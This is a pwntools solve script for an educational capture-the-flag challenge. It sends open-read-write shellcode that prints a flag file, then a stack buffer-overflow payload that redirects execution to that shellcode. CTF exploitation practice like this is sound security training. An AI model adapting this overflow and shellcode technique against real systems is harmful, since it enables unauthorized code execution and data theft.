#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *


context.arch = 'amd64'
r = remote('edu-ctf.csie.org', 10171)
# r = process('./orw-dd08e5c4f8fcd27ad3468b8243c4585e')


fname = '/home/orw/flag'
buf = 0x601160
shellcode  = shellcraft.amd64.linux.open(fname)
shellcode += shellcraft.amd64.linux.read('rax', buf, 0x30)
shellcode += shellcraft.amd64.linux.write(1, buf, 'rax')

r.recvuntil('Give me your shellcode>\n')
r.sendline(asm(shellcode))

payload = 'a'*0x10 + 'b'*8 + p64(0x6010a0)

r.recvuntil('I give you bof, you know what to do :)\n')
r.sendline(payload)

r.interactive()
